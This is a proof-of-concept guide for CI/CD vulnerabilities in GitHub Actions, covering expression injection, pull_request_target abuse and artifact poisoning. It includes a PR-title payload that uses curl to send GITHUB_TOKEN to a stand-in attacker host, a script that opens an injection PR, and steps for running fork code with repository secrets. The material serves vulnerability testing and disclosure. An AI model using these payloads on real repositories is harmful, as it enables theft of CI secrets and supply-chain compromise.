# PoC Guide: CI/CD and Workflow Vulnerabilities

Use this when a finding is **Critical** or **High** and involves GitHub Actions injection, permission abuse, artifact poisoning, or related CI/CD issues.

## When to use

- GitHub Actions code injection (expression injection in `run:` steps), unsafe `pull_request_target` usage, artifact poisoning, secrets exposure via workflows, unpinned/vulnerable actions.

## Key difference from web PoCs

CI/CD PoCs typically involve creating a PR, issue, or commit with a crafted payload rather than sending HTTP requests. The "exploit" is often a git operation, not a script.

## What to ask the user

| What to ask | Example / notes |
|-------------|------------------|
| **Repository** | Which repo contains the vulnerable workflow |
| **Workflow file** | Path to the `.yml` file (e.g. `.github/workflows/ci.yml`) |
| **Trigger** | What event triggers the workflow (`pull_request`, `issue_comment`, `pull_request_target`) |
| **Injection point** | Which `${{ }}` expression is vulnerable (e.g. `github.event.pull_request.title`) |
| **Test environment** | Fork of the repo, or a test repo with the same workflow |

## Workflow

### For expression injection

1. **Identify the injection point**: which `${{ }}` expression in which `run:` step.
2. **Craft the payload**: a PR title, branch name, issue body, or commit message containing shell injection.
3. **Demonstrate the PoC**:

   **Option A: Document the attack** (no execution needed):
   ```
   Vulnerable step:
     run: echo "Building ${{ github.event.pull_request.title }}"

   Attack: Create PR with title:
     "; curl https://attacker.com/callback?token=$GITHUB_TOKEN; #

   Result: GITHUB_TOKEN exfiltrated to attacker server.
   ```

   **Option B: Safe proof** (use benign command):
   Create a PR with title: `"; echo "INJECTED"; #`
   Check the workflow run logs for "INJECTED" in the output.

### For pull_request_target abuse

1. Fork the target repository.
2. Add malicious code to the fork (e.g. modify `package.json` scripts, add a `Makefile` target).
3. Open a PR from the fork to the target.
4. If the workflow checks out `${{ github.event.pull_request.head.sha }}` and runs build/test steps, the forked code executes with base repo permissions and secrets.

### For artifact poisoning

1. Identify the workflow that uploads artifacts.
2. Identify the workflow that downloads and uses those artifacts.
3. If the upload workflow runs on PRs from forks, demonstrate that a fork PR can upload a modified artifact that the consuming workflow trusts.

## Shell script PoC (for documenting, not executing)

```bash
#!/bin/bash
# PoC: GitHub Actions expression injection in workflow [name]
# This script creates a PR with a crafted title to demonstrate the injection.
# Run against a TEST REPOSITORY ONLY.

REPO="owner/test-repo"
BRANCH="poc-injection-$(date +%s)"

git checkout -b "$BRANCH"
git commit --allow-empty -m "PoC test"
git push origin "$BRANCH"

# Create PR with injected title
gh pr create \
  --repo "$REPO" \
  --head "$BRANCH" \
  --title '"; echo INJECTED; #' \
  --body "PoC for expression injection. Check workflow logs for INJECTED."

echo "Check the workflow run logs for evidence of injection."
```

## Verification

- **Expression injection**: Check workflow run logs for injected command output.
- **Secret exfiltration**: Use a webhook catcher (e.g. webhook.site) as the callback URL to verify secret reaches attacker.
- **Artifact poisoning**: Verify the consuming workflow used the tampered artifact (check output, deployed artifact, or logs).
